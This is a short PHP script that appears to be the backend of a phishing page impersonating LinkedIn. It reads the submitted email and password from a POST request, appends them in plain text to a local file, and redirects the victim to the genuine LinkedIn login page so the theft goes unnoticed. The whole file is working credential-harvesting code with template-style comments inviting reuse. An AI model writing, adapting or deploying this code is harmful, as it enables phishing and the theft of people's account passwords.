<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $username = $_POST['email'];
  $password = $_POST['password'];

  // Save data to a file (not recommended for security reasons)
  $file = fopen("user_data.txt", "a"); // Open file in append mode
  fwrite($file, "Username: " . $username . " - Password: " . $password . "\n");
  fclose($file);

  // Redirect to a success page (or display a success message)
  header('Location: https://www.linkedin.com/login'); // Replace with your success page
  exit();
}
?>
